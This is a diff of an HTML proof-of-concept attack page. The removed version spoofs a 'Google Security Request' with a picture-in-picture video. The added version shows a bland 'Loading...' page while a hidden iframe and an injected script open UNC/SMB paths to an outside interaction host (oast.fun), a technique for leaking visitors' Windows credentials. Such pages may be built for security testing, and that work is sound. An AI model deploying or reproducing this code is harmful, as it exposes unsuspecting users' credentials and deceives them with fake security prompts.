@@ -1,15 +1,24 @@
 <!DOCTYPE html>
 <html>
-<head><title>Secure Video</title></head>
-<body>
-  <video id="spoofVideo" src="fake-google-security.mp4" autoplay muted loop></video>
-  <button onclick="runPip()">Google Security Request</button>
+  <head>
+    <title>Welcome</title>
+    <style>
+      iframe {
+        display: none; /* Iframe tidak terlihat */
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Loading...</h1>
 
-  <script>
-    async function runPip() {
-      const v = document.getElementById("spoofVideo");
-      await v.requestPictureInPicture();
-    }
-  </script>
-</body>
+    <!-- Trigger hidden SMB connection via UNC path -->
+    <iframe src="file://///jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/hidden.jpg"></iframe>
+
+    <script>
+      // Optional: trigger fallback using script fetch as secondary method
+      const s = document.createElement("script");
+      s.src = "\\\\jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun\\backup.js";
+      document.body.appendChild(s);
+    </script>
+  </body>
 </html>
